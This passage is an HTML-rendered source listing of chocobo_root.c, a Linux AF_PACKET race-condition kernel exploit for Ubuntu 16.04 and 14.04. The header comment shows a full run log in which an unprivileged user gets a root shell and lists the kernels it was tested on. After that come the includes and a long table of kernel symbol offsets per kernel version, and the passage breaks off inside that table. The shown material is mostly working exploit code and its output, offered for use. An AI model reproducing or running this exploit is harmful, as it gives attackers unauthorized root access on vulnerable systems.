class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">chocobo_root.c</span></span><br><span class="line"><span class="comment">linux AF_PACKET race condition exploit</span></span><br><span class="line"><span class="comment">exploit for Ubuntu 16.04 x86_64</span></span><br><span class="line"><span class="comment">vroom vroom</span></span><br><span class="line"><span class="comment">*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=</span></span><br><span class="line"><span class="comment">user@ubuntu:~$ uname -a</span></span><br><span class="line"><span class="comment">Linux ubuntu 4.4.0-51-generic #72-Ubuntu SMP Thu Nov 24 18:29:54 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="comment">user@ubuntu:~$ id</span></span><br><span class="line"><span class="comment">uid=1000(user) gid=1000(user) groups=1000(user)</span></span><br><span class="line"><span class="comment">user@ubuntu:~$ gcc chocobo_root.c -o chocobo_root -lpthread</span></span><br><span class="line"><span class="comment">user@ubuntu:~$ ./chocobo_root</span></span><br><span class="line"><span class="comment">linux AF_PACKET race condition exploit by rebel</span></span><br><span class="line"><span class="comment">kernel version: 4.4.0-51-generic #72</span></span><br><span class="line"><span class="comment">proc_dostring = 0xffffffff81088090</span></span><br><span class="line"><span class="comment">modprobe_path = 0xffffffff81e48f80</span></span><br><span class="line"><span class="comment">register_sysctl_table = 0xffffffff812879a0</span></span><br><span class="line"><span class="comment">set_memory_rw = 0xffffffff8106f320</span></span><br><span class="line"><span class="comment">exploit starting</span></span><br><span class="line"><span class="comment">making vsyscall page writable..</span></span><br><span class="line"><span class="comment">new exploit attempt starting, jumping to 0xffffffff8106f320, arg=0xffffffffff600000</span></span><br><span class="line"><span class="comment">sockets allocated</span></span><br><span class="line"><span class="comment">removing barrier and spraying..</span></span><br><span class="line"><span class="comment">version switcher stopping, x = -1 (y = 174222, last val = 2)</span></span><br><span class="line"><span class="comment">current packet version = 0</span></span><br><span class="line"><span class="comment">pbd-&gt;hdr.bh1.offset_to_first_pkt = 48</span></span><br><span class="line"><span class="comment">*=*=*=* TPACKET_V1 &amp;&amp; offset_to_first_pkt != 0, race won *=*=*=*</span></span><br><span class="line"><span class="comment">please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.</span></span><br><span class="line"><span class="comment">closing socket and verifying.......</span></span><br><span class="line"><span class="comment">vsyscall page altered!</span></span><br><span class="line"><span class="comment">stage 1 completed</span></span><br><span class="line"><span class="comment">registering new sysctl..</span></span><br><span class="line"><span class="comment">new exploit attempt starting, jumping to 0xffffffff812879a0, arg=0xffffffffff600850</span></span><br><span class="line"><span class="comment">sockets allocated</span></span><br><span class="line"><span class="comment">removing barrier and spraying..</span></span><br><span class="line"><span class="comment">version switcher stopping, x = -1 (y = 30773, last val = 0)</span></span><br><span class="line"><span class="comment">current packet version = 2</span></span><br><span class="line"><span class="comment">pbd-&gt;hdr.bh1.offset_to_first_pkt = 48</span></span><br><span class="line"><span class="comment">race not won</span></span><br><span class="line"><span class="comment">retrying stage..</span></span><br><span class="line"><span class="comment">new exploit attempt starting, jumping to 0xffffffff812879a0, arg=0xffffffffff600850</span></span><br><span class="line"><span class="comment">sockets allocated</span></span><br><span class="line"><span class="comment">removing barrier and spraying..</span></span><br><span class="line"><span class="comment">version switcher stopping, x = -1 (y = 133577, last val = 2)</span></span><br><span class="line"><span class="comment">current packet version = 0</span></span><br><span class="line"><span class="comment">pbd-&gt;hdr.bh1.offset_to_first_pkt = 48</span></span><br><span class="line"><span class="comment">*=*=*=* TPACKET_V1 &amp;&amp; offset_to_first_pkt != 0, race won *=*=*=*</span></span><br><span class="line"><span class="comment">please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.</span></span><br><span class="line"><span class="comment">closing socket and verifying.......</span></span><br><span class="line"><span class="comment">sysctl added!</span></span><br><span class="line"><span class="comment">stage 2 completed</span></span><br><span class="line"><span class="comment">binary executed by kernel, launching rootshell</span></span><br><span class="line"><span class="comment">root@ubuntu:~# id</span></span><br><span class="line"><span class="comment">uid=0(root) gid=0(root) groups=0(root),1000(user)</span></span><br><span class="line"><span class="comment">*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=</span></span><br><span class="line"><span class="comment">There are offsets included for older kernels, but they're untested</span></span><br><span class="line"><span class="comment">so be aware that this exploit will probably crash kernels older than 4.4.</span></span><br><span class="line"><span class="comment">tested on:</span></span><br><span class="line"><span class="comment">Ubuntu 16.04: 4.4.0-51-generic</span></span><br><span class="line"><span class="comment">Ubuntu 16.04: 4.4.0-47-generic</span></span><br><span class="line"><span class="comment">Ubuntu 16.04: 4.4.0-36-generic</span></span><br><span class="line"><span class="comment">Ubuntu 14.04: 4.4.0-47-generic #68~14.04.1-Ubuntu</span></span><br><span class="line"><span class="comment">Shoutouts to:</span></span><br><span class="line"><span class="comment">jsc for inspiration (https://www.youtube.com/watch?v=x4UDIfcYMKI)</span></span><br><span class="line"><span class="comment">mcdelivery for delivering hotcakes and coffee</span></span><br><span class="line"><span class="comment">11/2016</span></span><br><span class="line"><span class="comment">by rebel</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> barrier = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">volatile</span> <span class="keyword">int</span> vers_switcher_done = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">offset</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> *kernel_version;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> proc_dostring;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> modprobe_path;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> register_sysctl_table;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> set_memory_rw;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">offset</span> *<span class="title">off</span> = <span class="title">NULL</span>;</span></span><br><span class="line"><span class="comment">//99% of these offsets haven't actually been tested :)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">offset</span> <span class="title">offsets</span>[] = &#123;</span></span><br><span class="line">    &#123;<span class="string">"4.4.0-46-generic #67~14.04.1"</span>,<span class="number">0xffffffff810842f0</span>,<span class="number">0xffffffff81e4b100</span>,<span class="number">0xffffffff81274580</span>,<span class="number">0xffffffff8106b880</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-47-generic #68~14.04.1"</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-41-generic #48"</span>,<span class="number">0xffffffff81083470</span>,<span class="number">0xffffffff81e48920</span>,<span class="number">0xffffffff812775c0</span>,<span class="number">0xffffffff8106c680</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.8.0-22-generic #24"</span>,<span class="number">0xffffffff8108ab70</span>,<span class="number">0xffffffff81e47880</span>,<span class="number">0xffffffff812b34b0</span>,<span class="number">0xffffffff8106f0d0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-34-generic #39"</span>,<span class="number">0xffffffff81082080</span>,<span class="number">0xffffffff81c487e0</span>,<span class="number">0xffffffff81274490</span>,<span class="number">0xffffffff8106b5d0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-30-generic #36"</span>,<span class="number">0xffffffff810820d0</span>,<span class="number">0xffffffff81c487e0</span>,<span class="number">0xffffffff812744e0</span>,<span class="number">0xffffffff8106b620</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-16-generic #19"</span>,<span class="number">0xffffffff81081ac0</span>,<span class="number">0xffffffff81c48680</span>,<span class="number">0xffffffff812738f0</span>,<span class="number">0xffffffff8106b110</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-17-generic #21"</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-18-generic #22"</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-19-generic #23~14.04.1"</span>,<span class="number">0xffffffff8107d640</span>,<span class="number">0xffffffff81c497c0</span>,<span class="number">0xffffffff8125de30</span>,<span class="number">0xffffffff81067750</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-21-generic #25~14.04.1"</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-30-generic #36~14.04.1"</span>,<span class="number">0xffffffff8107da40</span>,<span class="number">0xffffffff81c4a8e0</span>,<span class="number">0xffffffff8125dd40</span>,<span class="number">0xffffffff81067b20</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-27-generic #32~14.04.1"</span>,<span class="number">0xffffffff8107dbe0</span>,<span class="number">0xffffffff81c498c0</span>,<span class="number">0xffffffff8125e420</span>,<span class="number">0xffffffff81067c60</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-36-generic #42"</span>,<span class="number">0xffffffff81083430</span>,<span class="number">0xffffffff81e488e0</span>,<span class="number">0xffffffff81277380</span>,<span class="number">0xffffffff8106c680</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-22-generic #40"</span>,<span class="number">0xffffffff81087d40</span>,<span class="number">0xffffffff81e48f00</span>,<span class="number">0xffffffff812864d0</span>,<span class="number">0xffffffff8106f370</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-18-generic #22~14.04.1"</span>,<span class="number">0xffffffff8107d620</span>,<span class="number">0xffffffff81c49780</span>,<span class="number">0xffffffff8125dd10</span>,<span class="number">0xffffffff81067760</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-34-generic #53"</span>,<span class="number">0xffffffff81087ea0</span>,<span class="number">0xffffffff81e48f80</span>,<span class="number">0xffffffff81286ed0</span>,<span class="number">0xffffffff8106f370</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-22-generic #27"</span>,<span class="number">0xffffffff81081ad0</span>,<span class="number">0xffffffff81c486c0</span>,<span class="number">0xffffffff81273b20</span>,<span class="number">0xffffffff8106b100</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-23-generic #28"</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-25-generic #30"</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-36-generic #55"</span>,<span class="number">0xffffffff81087ea0</span>,<span class="number">0xffffffff81e48f80</span>,<span class="number">0xffffffff81286e50</span>,<span class="number">0xffffffff8106f360</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-42-generic #49"</span>,<span class="number">0xffffffff81083490</span>,<span class="number">0xffffffff81e489a0</span>,<span class="number">0xffffffff81277870</span>,<span class="number">0xffffffff8106c680</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-31-generic #50"</span>,<span class="number">0xffffffff81087ea0</span>,<span class="number">0xffffffff81e48f80</span>,<span class="number">0xffffffff81286e90</span>,<span class="number">0xffffffff8106f370</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-22-generic #40~14.04.1"</span>,<span class="number">0xffffffff81084250</span>,<span class="number">0xffffffff81c4b080</span>,<span class="number">0xffffffff81273de0</span>,<span class="number">0xffffffff8106b9d0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-38-generic #45"</span>,<span class="number">0xffffffff810833d0</span>,<span class="number">0xffffffff81e488e0</span>,<span class="number">0xffffffff81277410</span>,<span class="number">0xffffffff8106c680</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-45-generic #66"</span>,<span class="number">0xffffffff81087fc0</span>,<span class="number">0xffffffff81e48f80</span>,<span class="number">0xffffffff812874c0</span>,<span class="number">0xffffffff8106f320</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-36-generic #42~14.04.1"</span>,<span class="number">0xffffffff8107ffd0</span>,<span class="number">0xffffffff81c499e0</span>,<span class="number">0xffffffff81261ea0</span>,<span class="number">0xffffffff81069d00</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-45-generic #66~14.04.1"</span>,<span class="number">0xffffffff81084260</span>,<span class="number">0xffffffff81e4b100</span>,<span class="number">0xffffffff81274340</span>,<span class="number">0xffffffff8106b880</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-22-generic #27~14.04.1"</span>,<span class="number">0xffffffff8107d640</span>,<span class="number">0xffffffff81c497c0</span>,<span class="number">0xffffffff8125deb0</span>,<span class="number">0xffffffff81067750</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-25-generic #30~14.04.1"</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-23-generic #28~14.04.1"</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-46-generic #67"</span>,<span class="number">0xffffffff81088040</span>,<span class="number">0xffffffff81e48f80</span>,<span class="number">0xffffffff81287800</span>,<span class="number">0xffffffff8106f320</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-47-generic #68"</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-34-generic #53~14.04.1"</span>,<span class="number">0xffffffff81084160</span>,<span class="number">0xffffffff81c4b100</span>,<span class="number">0xffffffff81273c40</span>,<span class="number">0xffffffff8106b880</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-36-generic #55~14.04.1"</span>,<span class="number">0xffffffff81084160</span>,<span class="number">0xffffffff81c4b100</span>,<span class="number">0xffffffff81273c60</span>,<span class="number">0xffffffff8106b890</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-31-generic #50~14.04.1"</span>,<span class="number">0xffffffff81084160</span>,<span class="number">0xffffffff81c4b100</span>,<span class="number">0xffffffff81273c20</span>,<span class="number">0xffffffff8106b880</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-38-generic #45~14.04.1"</span>,<span class="number">0xffffffff8107fdc0</span>,<span class="number">0xffffffff81c4a9e0</span>,<span class="number">0xffffffff81261540</span>,<span class="number">0xffffffff81069bf0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-35-generic #40"</span>,<span class="number">0xffffffff81083430</span>,<span class="number">0xffffffff81e48860</span>,<span class="number">0xffffffff81277240</span>,<span class="number">0xffffffff8106c680</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-24-generic #43~14.04.1"</span>,<span class="number">0xffffffff81084120</span>,<span class="number">0xffffffff81c4b080</span>,<span class="number">0xffffffff812736f0</span>,<span class="number">0xffffffff8106b880</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-21-generic #37"</span>,<span class="number">0xffffffff81087cf0</span>,<span class="number">0xffffffff81e48e80</span>,<span class="number">0xffffffff81286310</span>,<span class="number">0xffffffff8106f370</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-34-generic #39~14.04.1"</span>,<span class="number">0xffffffff8107dc50</span>,<span class="number">0xffffffff81c498e0</span>,<span class="number">0xffffffff8125e830</span>,<span class="number">0xffffffff81067c90</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-24-generic #43"</span>,<span class="number">0xffffffff81087e60</span>,<span class="number">0xffffffff81e48f00</span>,<span class="number">0xffffffff812868f0</span>,<span class="number">0xffffffff8106f370</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-21-generic #37~14.04.1"</span>,<span class="number">0xffffffff81084220</span>,<span class="number">0xffffffff81c4b000</span>,<span class="number">0xffffffff81273a30</span>,<span class="number">0xffffffff8106b9d0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-41-generic #48~14.04.1"</span>,<span class="number">0xffffffff8107fe20</span>,<span class="number">0xffffffff81c4aa20</span>,<span class="number">0xffffffff812616c0</span>,<span class="number">0xffffffff81069bf0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.8.0-27-generic #29"</span>,<span class="number">0xffffffff8108ab70</span>,<span class="number">0xffffffff81e47880</span>,<span class="number">0xffffffff812b3490</span>,<span class="number">0xffffffff8106f0d0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.8.0-26-generic #28"</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-38-generic #57"</span>,<span class="number">0xffffffff81087f70</span>,<span class="number">0xffffffff81e48f80</span>,<span class="number">0xffffffff81287470</span>,<span class="number">0xffffffff8106f360</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-42-generic #62~14.04.1"</span>,<span class="number">0xffffffff81084260</span>,<span class="number">0xffffffff81e4b100</span>,<span class="number">0xffffffff81274300</span>,<span class="number">0xffffffff8106b880</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-38-generic #57~14.04.1"</span>,<span class="number">0xffffffff81084210</span>,<span class="number">0xffffffff81e4b100</span>,<span class="number">0xffffffff812742e0</span>,<span class="number">0xffffffff8106b890</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-49-generic #70"</span>,<span class="number">0xffffffff81088090</span>,<span class="number">0xffffffff81e48f80</span>,<span class="number">0xffffffff81287d40</span>,<span class="number">0xffffffff8106f320</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-49-generic #70~14.04.1"</span>,<span class="number">0xffffffff81084350</span>,<span class="number">0xffffffff81e4b100</span>,<span class="number">0xffffffff81274b10</span>,<span class="number">0xffffffff8106b880</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-21-generic #25"</span>,<span class="number">0xffffffff81081ad0</span>,<span class="number">0xffffffff81c486c0</span>,<span class="number">0xffffffff81273aa0</span>,<span class="number">0xffffffff8106b100</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-19-generic #23"</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.2.0-42-generic #49~14.04.1"</span>,<span class="number">0xffffffff8107fe20</span>,<span class="number">0xffffffff81c4aaa0</span>,<span class="number">0xffffffff81261980</span>,<span class="number">0xffffffff81069bf0</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-43-generic #63"</span>,<span class="number">0xffffffff81087fc0</span>,<span class="number">0xffffffff81e48f80</span>,<span class="number">0xffffffff812874b0</span>,<span class="number">0xffffffff8106f320</span>&#125;,</span><br><span class="line">    &#123;<span class="string">"4.4.0-28-generic #47"</span>,<span class="number">0xffffffff81087ea0</span>,<span class="number">0xffffffff81e48f80</span>,<span class="number">0xffffffff81286df0</span>,<span class="number">0xffffffff8106f370</span>&#125;,</span><br><span class="line">    &#123;<span 